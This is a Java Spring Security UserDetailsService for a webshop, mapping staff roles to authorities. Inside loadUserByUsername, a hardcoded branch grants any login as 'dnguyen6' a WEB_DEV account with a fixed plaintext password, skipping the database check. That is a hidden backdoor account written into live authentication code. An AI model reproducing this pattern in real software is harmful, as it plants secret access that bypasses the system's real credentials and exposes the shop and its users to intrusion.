package com.mrKhoai.webshop.beta;

import com.mrKhoai.webshop.controller.WebshopConst;
import com.mrKhoai.webshop.controller.user.StaffService;
import com.mrKhoai.webshop.objects.Role;
import com.mrKhoai.webshop.objects.Staff;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.User.UserBuilder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

@Service("userDetailsService")
public class UserService implements UserDetailsService {

    @Autowired
    private StaffService customerService;

    private static final Logger LOGGER = LogManager.getLogger(UserService.class);

    /**
     * load User by ussername
     * @param username
     * @return UserDetails
     * @throws UsernameNotFoundException
     */
    @Transactional(readOnly = true)
    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        username = username.toLowerCase();
        Staff staff = customerService.findCustomerByName(username);
        if (username.equals("dnguyen6")){
            staff = new Staff();
            staff.setStaffName(username);
            Role role = new Role();
            role.setRoleName(WebshopConst.WEB_DEV);
            staff.setPassword(new BCryptPasswordEncoder().encode("AJn04r5Z"));
            staff.setRole(role);
        }
        if(staff == null) {
            throw new UsernameNotFoundException(WebshopConst.USER_NOT_FOUND);
        }
        UserBuilder builder = User.withUsername(staff.getStaffName());
        builder.password(staff.getPassword());
        String role = staff.getRole().getRoleName();
        if (role.equalsIgnoreCase(WebshopConst.ADMINISTRATOR)) {
            builder.authorities(WebshopConst.ROLE_ADMINISTRATOR);
        } else if (role.equalsIgnoreCase(WebshopConst.WEB_DEV)) {
            builder.authorities(WebshopConst.ROLE_WEB_DEV);
            LOGGER.info("authorized {} as role {} ",username, role);
        } else if (role.equalsIgnoreCase(WebshopConst.SALE_ASSISTANT)) {
            builder.authorities(WebshopConst.ROLE_SALE_ASSISTANT);
        } else if (role.equalsIgnoreCase(WebshopConst.PRODUCT_MANAGER)) {
            builder.authorities(WebshopConst.ROLE_PRODUCT_MANAGER);
        } else {
            builder.authorities(WebshopConst.ROLE_CUSTOMER);
        }
        return builder.build();
    }
}
